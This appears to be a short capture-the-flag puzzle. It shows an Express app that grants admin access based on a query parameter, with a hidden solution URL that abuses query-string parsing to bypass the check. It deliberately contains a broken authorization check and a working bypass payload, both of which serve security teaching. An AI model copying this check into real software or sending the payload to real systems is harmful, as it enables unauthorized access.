# Toxic Admin Check
Can you reach the administration panel?
```nodejs
const express = require('express')
const app = express()
const port = 3004

app.get('/admin', (req, res) => {
    const isAdmin = req.query?.user?.isAdmin
    if (isAdmin === true) {
        res.send('Welcome to admin panel!')
    } else {
        res.send('Access Denied!')
    }
})

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})
```
<details>
  <summary>Toggle to see the solution</summary>

  ```
  http://localhost:3004/admin?user[isAdmin]=1&user=isAdmin
  ```

</details>